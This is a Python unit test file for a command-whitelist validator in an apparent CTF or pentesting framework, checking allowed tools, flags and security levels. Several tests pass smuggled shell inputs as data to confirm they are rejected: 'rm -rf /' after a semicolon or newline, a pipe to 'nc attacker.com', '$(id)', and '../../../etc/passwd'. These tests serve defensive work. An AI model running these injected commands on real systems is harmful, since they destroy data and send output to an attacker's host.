"""Unit tests for command whitelist security system."""

import pytest
import sys
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / 'src'))

from ctf_core.utils.command_whitelist import (
    CommandWhitelist,
    ToolDefinition,
    SecurityLevel,
    get_command_whitelist,
)


class TestSecurityLevel:
    """Test SecurityLevel enum."""
    
    def test_security_levels_exist(self):
        """Test that all security levels exist."""
        assert hasattr(SecurityLevel, 'LOW')
        assert hasattr(SecurityLevel, 'MEDIUM')
        assert hasattr(SecurityLevel, 'HIGH')
        assert hasattr(SecurityLevel, 'PARANOID')
    
    def test_security_level_values(self):
        """Test security level values."""
        assert SecurityLevel.LOW.value == 'low'
        assert SecurityLevel.MEDIUM.value == 'medium'
        assert SecurityLevel.HIGH.value == 'high'
        assert SecurityLevel.PARANOID.value == 'paranoid'


class TestToolDefinition:
    """Test ToolDefinition dataclass."""
    
    def test_tool_definition_creation(self):
        """Test creating a tool definition."""
        tool = ToolDefinition(
            name="test_tool",
            description="A test tool",
            binary="test",
            allowed_flags=["-a", "-b"],
            max_args=5,
            security_level=SecurityLevel.MEDIUM,
        )
        
        assert tool.name == "test_tool"
        assert tool.description == "A test tool"
        assert tool.binary == "test"
        assert tool.allowed_flags == ["-a", "-b"]
        assert tool.max_args == 5
        assert tool.security_level == SecurityLevel.MEDIUM
        assert tool.requires_sandbox is True


class TestCommandWhitelist:
    """Test CommandWhitelist class."""
    
    def test_whitelist_creation(self):
        """Test creating a command whitelist."""
        whitelist = CommandWhitelist()
        assert whitelist.security_level == SecurityLevel.MEDIUM
        assert len(whitelist._tools) > 0
    
    def test_whitelist_with_security_level(self):
        """Test creating whitelist with specific security level."""
        whitelist = CommandWhitelist(security_level=SecurityLevel.HIGH)
        assert whitelist.security_level == SecurityLevel.HIGH
    
    def test_tool_registration(self):
        """Test registering a custom tool."""
        whitelist = CommandWhitelist()
        
        custom_tool = ToolDefinition(
            name="custom_tool",
            description="Custom test tool",
            binary="custom",
            allowed_flags=["-x", "-y"],
        )
        
        whitelist.register_tool(custom_tool)
        assert "custom_tool" in whitelist._tools
    
    def test_get_allowed_tools(self):
        """Test getting list of allowed tools."""
        whitelist = CommandWhitelist()
        tools = whitelist.get_allowed_tools()
        
        assert isinstance(tools, list)
        assert len(tools) > 0
        
        # Check structure
        for tool in tools:
            assert 'name' in tool
            assert 'description' in tool
            assert 'security_level' in tool
            assert 'requires_sandbox' in tool
    
    def test_default_tools_registered(self):
        """Test that default tools are registered."""
        whitelist = CommandWhitelist()
        tool_names = [tool['name'] for tool in whitelist.get_allowed_tools()]
        
        # Check common tools
        assert 'nmap' in tool_names
        assert 'sqlmap' in tool_names
        assert 'hydra' in tool_names
        assert 'hashcat' in tool_names


class TestCommandValidation:
    """Test command validation."""
    
    def test_validate_allowed_command(self):
        """Test validating an allowed command."""
        whitelist = CommandWhitelist()
        
        # Nmap with valid arguments
        is_valid, error_msg, args = whitelist.validate_command(
            "nmap",
            ["-sV", "10.10.10.10"]
        )
        
        assert is_valid
        assert error_msg == ""
        assert len(args) == 2
    
    def test_validate_unknown_tool(self):
        """Test validating an unknown tool."""
        whitelist = CommandWhitelist()
        
        is_valid, error_msg, args = whitelist.validate_command(
            "unknown_tool",
            ["arg1"]
        )
        
        assert not is_valid
        assert "not in the whitelist" in error_msg
        assert len(args) == 0
    
    def test_validate_forbidden_flag(self):
        """Test validating a command with forbidden flag."""
        whitelist = CommandWhitelist()
        
        # Searchsploit with -x flag (forbidden)
        is_valid, error_msg, args = whitelist.validate_command(
            "searchsploit",
            ["-x", "apache"]
        )
        
        assert not is_valid
        assert "forbidden" in error_msg.lower()
    
    def test_validate_dangerous_pattern(self):
        """Test validating command with dangerous pattern."""
        whitelist = CommandWhitelist()
        
        # Nmap with shell metacharacter
        is_valid, error_msg, args = whitelist.validate_command(
            "nmap",
            ["10.10.10.10; rm -rf /"]
        )
        
        assert not is_valid
        assert "forbidden pattern" in error_msg.lower()
    
    def test_validate_too_many_args(self):
        """Test validating command with too many arguments."""
        whitelist = CommandWhitelist()
        
        # Create tool with low max_args
        tool = ToolDefinition(
            name="limited_tool",
            description="Tool with limited args",
            binary="limited",
            max_args=2,
        )
        whitelist.register_tool(tool)
        
        is_valid, error_msg, args = whitelist.validate_command(
            "limited_tool",
            ["arg1", "arg2", "arg3", "arg4"]  # 4 args, max is 2
        )
        
        assert not is_valid
        assert "Too many arguments" in error_msg
    
    def test_validate_security_level_restriction(self):
        """Test security level restrictions."""
        whitelist = CommandWhitelist(security_level=SecurityLevel.LOW)
        
        # SQLMap requires HIGH security level
        is_valid, error_msg, args = whitelist.validate_command(
            "sqlmap",
            ["-u", "http://example.com"]
        )
        
        assert not is_valid
        assert "higher security level" in error_msg
    
    def test_validate_valid_ip_target(self):
        """Test validating IP address target."""
        whitelist = CommandWhitelist()
        
        is_valid, error_msg, args = whitelist.validate_command(
            "nmap",
            ["192.168.1.1"]
        )
        
        assert is_valid
    
    def test_validate_valid_url_target(self):
        """Test validating URL target."""
        whitelist = CommandWhitelist()
        
        is_valid, error_msg, args = whitelist.validate_command(
            "sqlmap",
            ["-u", "http://example.com"]
        )
        
        assert is_valid


class TestArgumentValidation:
    """Test argument validation."""
    
    def test_validate_flag_with_equals(self):
        """Test flag with equals sign."""
        whitelist = CommandWhitelist()
        
        is_valid, error_msg, args = whitelist.validate_command(
            "nmap",
            ["-p=80,443"]
        )
        
        assert is_valid
    
    def test_validate_combined_short_flags(self):
        """Test combined short flags."""
        whitelist = CommandWhitelist()
        
        is_valid, error_msg, args = whitelist.validate_command(
            "nmap",
            ["-sV"]
        )
        
        assert is_valid
    
    def test_validate_long_flag(self):
        """Test long flag."""
        whitelist = CommandWhitelist()
        
        is_valid, error_msg, args = whitelist.validate_command(
            "sqlmap",
            ["--batch"]
        )
        
        assert is_valid
    
    def test_validate_path_argument(self):
        """Test path argument."""
        whitelist = CommandWhitelist()
        
        is_valid, error_msg, args = whitelist.validate_command(
            "nikto",
            ["-h", "10.10.10.10"]
        )
        
        assert is_valid


class TestForbiddenPatterns:
    """Test forbidden pattern detection."""
    
    def test_detect_shell_metacharacters(self):
        """Test detection of shell metacharacters."""
        whitelist = CommandWhitelist()
        
        patterns_to_test = [
            "10.10.10.10; ls",
            "10.10.10.10 && rm -rf /",
            "10.10.10.10 || exit",
            "10.10.10.10 | nc attacker.com",
            "10.10.10.10 `whoami`",
            "10.10.10.10 $(id)",
        ]
        
        for pattern in patterns_to_test:
            is_valid, error_msg, args = whitelist.validate_command(
                "nmap",
                [pattern]
            )
            assert not is_valid, f"Pattern should be forbidden: {pattern}"
    
    def test_detect_directory_traversal(self):
        """Test detection of directory traversal."""
        whitelist = CommandWhitelist()
        
        is_valid, error_msg, args = whitelist.validate_command(
            "nmap",
            ["../../../etc/passwd"]
        )
        
        assert not is_valid
    
    def test_detect_redirection(self):
        """Test detection of redirection."""
        whitelist = CommandWhitelist()
        
        is_valid, error_msg, args = whitelist.validate_command(
            "nmap",
            ["10.10.10.10 > /tmp/output"]
        )
        
        assert not is_valid
    
    def test_detect_newlines(self):
        """Test detection of newlines."""
        whitelist = CommandWhitelist()
        
        is_valid, error_msg, args = whitelist.validate_command(
            "nmap",
            ["10.10.10.10\nrm -rf /"]
        )
        
        assert not is_valid


class TestGetCommandWhitelist:
    """Test get_command_whitelist convenience function."""
    
    def test_get_whitelist_singleton(self):
        """Test that get_command_whitelist returns singleton."""
        whitelist1 = get_command_whitelist()
        whitelist2 = get_command_whitelist()
        
        assert whitelist1 is whitelist2
    
    def test_get_whitelist_with_security_level(self):
        """Test getting whitelist with specific security level."""
        whitelist = get_command_whitelist(security_level=SecurityLevel.HIGH)
        assert whitelist.security_level == SecurityLevel.HIGH
    
    def test_set_security_level(self):
        """Test setting security level."""
        whitelist = get_command_whitelist()
        whitelist.set_security_level(SecurityLevel.PARANOID)
        assert whitelist.security_level == SecurityLevel.PARANOID


class TestToolSpecificValidation:
    """Test tool-specific validation rules."""
    
    def test_nmap_target_validation(self):
        """Test nmap target validation."""
        whitelist = CommandWhitelist()
        
        # Valid IP
        is_valid, error_msg, args = whitelist.validate_command(
            "nmap",
            ["192.168.1.1"]
        )
        assert is_valid
        
        # Valid hostname
        is_valid, error_msg, args = whitelist.validate_command(
            "nmap",
            ["scanme.nmap.org"]
        )
        assert is_valid
    
    def test_sqlmap_url_validation(self):
        """Test sqlmap URL validation."""
        whitelist = CommandWhitelist()
        
        # Valid URL
        is_valid, error_msg, args = whitelist.validate_command(
            "sqlmap",
            ["-u", "http://example.com"]
        )
        assert is_valid
    
    def test_ffuf_url_validation(self):
        """Test ffuf URL validation."""
        whitelist = CommandWhitelist()
        
        # Valid URL
        is_valid, error_msg, args = whitelist.validate_command(
            "ffuf",
            ["-u", "http://example.com/FUZZ"]
        )
        assert is_valid


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
